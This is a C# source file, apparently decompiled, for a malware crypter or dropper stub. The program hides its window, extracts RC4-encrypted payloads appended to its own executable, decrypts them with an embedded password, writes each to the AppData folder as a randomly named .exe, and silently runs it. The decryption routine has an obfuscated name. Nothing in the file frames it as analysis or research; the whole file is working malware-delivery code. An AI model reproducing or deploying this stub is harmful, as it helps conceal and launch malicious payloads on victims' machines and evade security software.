using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Program;

public class Main : Form
{
	public class MyMain
	{
		private static int RandomNumber(int min, int max)
		{
			Random random = new Random();
			return random.Next(min, max);
		}

		private static string RandomString(int size, bool lowerCase)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			checked
			{
				int num = size - 1;
				for (int i = 0; i <= num; i++)
				{
					char value = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
					stringBuilder.Append(value);
				}
				if (lowerCase)
				{
					return stringBuilder.ToString().ToLower();
				}
				return stringBuilder.ToString();
			}
		}

		private static string GetRandom()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(RandomString(4, lowerCase: true));
			stringBuilder.Append(RandomNumber(1000, 9999));
			stringBuilder.Append(RandomString(2, lowerCase: false));
			return stringBuilder.ToString();
		}

		public static void Main()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string text2 = "0£dæÈÉ\u00afr6\u00af3ÈÉr¤ÑXhàÃ\u0001Ï\u001eÑ\u00afXhàÃ\u0001";
			int num = FileSystem.FreeFile();
			FileSystem.FileOpen(num, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
			checked
			{
				string text3 = Strings.Space((int)FileSystem.FileLen(Application.get_ExecutablePath()));
				FileSystem.FileGet(num, ref text3, -1L, false);
				FileSystem.FileClose(new int[1] { num });
				string[] array = Strings.Split(text3, text2, -1, (CompareMethod)0);
				string text4 = GetRandom().ToString() + ".exe";
				string password = array[1];
				int num2 = Convert.ToInt32(array[2]) + 2;
				int num3 = num2;
				for (int i = 3; i <= num3; i++)
				{
					FileSystem.FileOpen(1, text + i + text4, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					FileSystem.FilePut(1, rc4.ASDASDADAWDAWDAWDAWDAWDAWDDAWDA(array[i], password), -1L, false);
					FileSystem.FileClose(new int[1] { 1 });
					try
					{
						Process.Start(text + i + text4);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				ProjectData.EndApp();
			}
		}
	}

	public class rc4
	{
		public static string ASDASDADAWDAWDAWDAWDAWDAWDDAWDA(string message, string password)
		{
			int num = 0;
			int num2 = 0;
			StringBuilder stringBuilder = new StringBuilder();
			string empty = string.Empty;
			int[] array = new int[257];
			int[] array2 = new int[257];
			int length = password.Length;
			int location = 0;
			while (location <= 255)
			{
				char c = password.Substring(location % length, 1).ToCharArray()[0];
				array2[location] = Strings.Asc(c);
				array[location] = location;
				Math.Max(Interlocked.Increment(ref location), checked(location - 1));
			}
			int num3 = 0;
			int location2 = 0;
			while (location2 <= 255)
			{
				num3 = checked(num3 + array[location2] + array2[location2]) % 256;
				int num4 = array[location2];
				array[location2] = array[num3];
				array[num3] = num4;
				Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
			}
			location = 1;
			while (location <= message.Length)
			{
				int num5 = 0;
				num = checked(num + 1) % 256;
				num2 = checked(num2 + array[num]) % 256;
				num5 = array[num];
				array[num] = array[num2];
				array[num2] = num5;
				int num6 = array[checked(array[num] + array[num2]) % 256];
				checked
				{
					char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
					num5 = Strings.Asc(c2);
					int num7 = num5 ^ num6;
					stringBuilder.Append(Strings.Chr(num7));
					Math.Max(Interlocked.Increment(ref location), location - 1);
				}
			}
			empty = stringBuilder.ToString();
			stringBuilder.Length = 0;
			return empty;
		}
	}

	private IContainer Components;

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Main());
	}

	public Main()
	{
		((Form)this).add_Load((EventHandler)Main_Load);
		Application.EnableVisualStyles();
		InitializeComponent();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 266);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Main");
		((Form)this).set_Text("Main");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	protected override void Dispose(bool Disposing)
	{
		if (Disposing && Components != null)
		{
			Components.Dispose();
		}
		((Form)this).Dispose(Disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
	}

	private void Main_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		MyMain.Main();
		Environment.Exit(0);
	}
}
